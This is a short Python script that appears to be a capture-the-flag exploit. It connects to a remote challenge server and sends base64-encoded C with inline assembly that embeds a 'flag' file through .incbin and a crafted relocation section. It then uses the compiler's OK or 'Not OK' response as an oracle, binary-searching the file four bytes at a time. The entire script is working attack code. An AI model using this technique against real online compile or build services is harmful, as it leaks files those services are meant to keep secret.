from braindead import *
import binascii
import sys
log.enable()
args = Args()
args.add('REAL', default=False)
args.parse()

def getconn():
	if args.REAL:
		return io.connect(('88.198.154.157', 8011))
	else:
		return io.connect(('172.17.0.2', 1024))

def oracle(word, guess):
	asm = r'''
	.global guess
	.set guess, GUESS
	.text

	foobar:
		.incbin "flag", OFFSET, 4

	.section .rel.text, "aMo", @9, 16, .text
	.8byte 4
	.4byte 10
	.4byte 4

	.text
	'''.replace('GUESS', str(guess)).replace('OFFSET', str(4*word))

	sol = '__asm__("' + asm.replace('\\', '\\\\').replace('"', '\\"').replace('\n', ';') + '");'

	r = getconn()
	r.sla('> ', binascii.b2a_base64(sol.encode(), newline=False))
	out = r.recv_until_eof()
	return b'Not OK' in out

flag = bytearray()

for i in range(0, 20):
	l = 0
	r = 0xffffffff
	while l < r:
		m = (r+l+1)//2
		if oracle(i, m):
			r = m-1
		else:
			l = m
		print(hex(l), hex(r), flag)
	flag += le.p32(0xffffffff-l)
	print(i, flag)
